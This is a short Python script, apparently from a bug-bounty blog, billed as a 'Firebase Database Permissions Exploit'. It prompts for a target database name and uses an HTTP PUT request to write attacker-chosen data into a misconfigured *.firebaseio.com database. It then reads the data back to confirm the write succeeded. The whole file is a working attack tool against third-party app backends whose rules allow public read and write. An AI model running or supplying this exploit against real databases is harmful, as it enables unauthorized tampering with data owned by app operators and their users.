# Author:
'''
Tele: @fucklraq
XMPP:iraq@sqli.io
'''
import requests

print ("""
			 (     (    (         (        )   (                
			 )\ )  )\ ) )\ )      )\ )  ( /(   )\ )   (         
			(()/( (()/((()/( (   (()/(  )\()) (()/(   )\   (    
			 /(_)) /(_))/(_)))\   /(_))((_)\   /(_))(((_)  )\   
			(_))_|(_)) (_)) ((_) (_))_|  ((_) (_))  )\___ ((_)  
			| |_  |_ _|| _ \| __|| |_   / _ \ | _ \((/ __|| __| 
			| __|  | | |   /| _| | __| | (_) ||   / | (__ | _|  
			|_|   |___||_|_\|___||_|    \___/ |_|_\  \___||___| 
                                                    


<============================================================================================================>
||                               \"Firebase Database Permissions Exploit                                     ||
||  Usage   : Provide target DB name, filename to be create, information to write                           ||
||  Blog    : Read Full Blog about                                                                          ||
||  Url     : https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty  ||
||  Info    : This is A simple Python Exploit to Write Data to Insecure/vulnerable firebase databases!      ||
||            Commonly found inside Mobile Apps.                                                            ||
||            If the owner of the app have set the security rules as true for both "read" & "write"         ||
||            an attacker can probably dump database and write his own data to firebase database.           ||
<============================================================================================================>
""")

line = "<<======================================================================>>"

#Input Data
print ("[>] Input Data for exploit\n")
site = input("[+] Enter firebase DB Name:") #*.firebaseio.com
file = input("[+] Enter A filename:")
name = input("[+] Enter your name:")
email= input("[+] Enter your email:")
message = input("[+] Enter A Message:")

#Payload
site_url = "https://"+site+".firebaseio.com/"+file+".json"

data = {"Exploit": "Successfull" , "email": email, "name": name, "message": message}

response = requests.put(site_url,json=data)

#Collecting file
print (line)
if response.status_code == 200:
    print ("[*] Exploited\n")
    print ("File Created: https://"+site+".firebaseio.com/"+file+".json\n")
else:
    print ("[*] Not Exploited\n")
    print ("No File Created")
print (line)
print ("""If you get a response 'Permission Denied' with 'Successfully
Exploited' This shows Exploit is written but can't be read.
Verify by visiting the URL""")
print (" ")
print("[>] Response\n")
r = requests.get("https://"+site+".firebaseio.com/"+file+".json")
print (r.text)
print (line)
#Reasoning
if response.status_code == 200:
 print ("[>>] Successfully Exploited")
elif response.status_code == 401:
 print ("[x] Not Exploitable \n[!] Reason: All Permissions Denied")
elif response.status_code == 404:
 print ("[x] Database Not Found \n[!] Reason: Firebase Database Not Found")
else:
 print ("[x] Unknown Error \n[!] Reason: Unknown Error\n")
